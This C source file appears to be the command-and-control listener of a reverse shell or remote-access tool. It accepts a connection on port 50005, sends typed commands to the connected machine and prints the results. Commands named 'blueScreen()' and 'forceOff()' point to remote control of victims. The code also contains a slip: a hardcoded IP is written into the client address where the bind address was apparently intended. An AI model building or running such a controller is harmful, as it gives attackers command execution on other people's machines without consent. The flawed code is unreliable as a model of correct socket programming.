#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
	int iSock, iSock_Client;
	char buffer[1024];
	char cResp[18384];
	struct sockaddr_in sAddress, cAddress;
	int n = 0;
	int value = 1;
	socklen_t cLen;

	iSock = socket(AF_INET, SOCK_STREAM, 0);

	if (setsockopt(iSock, SOL_SOCKET, SO_REUSEADDR, &value, sizeof(value)) < 0) {
		printf("%s\n", "cannot set socket settings");
		return 0x01;
	}

	sAddress.sin_family = AF_INET;
	cAddress.sin_addr.s_addr = inet_addr("192.168.1.226");
	sAddress.sin_port = htons(50005);

	if (bind(iSock, (struct sockaddr*)&sAddress, sizeof(sAddress)) != 0) {
		printf("%s\n", "failed to produce port bind");
		return 0x01;
	}
	listen(iSock, 5);
	cLen = sizeof(cAddress);
	iSock_Client = accept(iSock, (struct sockaddr*)&cAddress, &cLen);

	while (1) {
	jmp:
		bzero(&buffer, sizeof(buffer));
		bzero(&cResp, sizeof(cResp));
		printf("%s~$: ", inet_ntoa(cAddress.sin_addr));

		fgets(buffer, sizeof(buffer), (stdin));
		strtok(buffer, "\n");
		write(iSock_Client, buffer, sizeof(buffer));
		if (strncmp("q", buffer, 1) == 0) {
			break;
		}
		if (strncmp("blueScreen()", buffer, 12) == 0) {
			break;
		}
		if (strncmp("forceOff()", buffer, 12) == 0) {
			break;
		}
		else {
			recv(iSock_Client, cResp, sizeof(cResp), MSG_WAITALL);
			printf("%s\n", cResp);
		}
	}
}
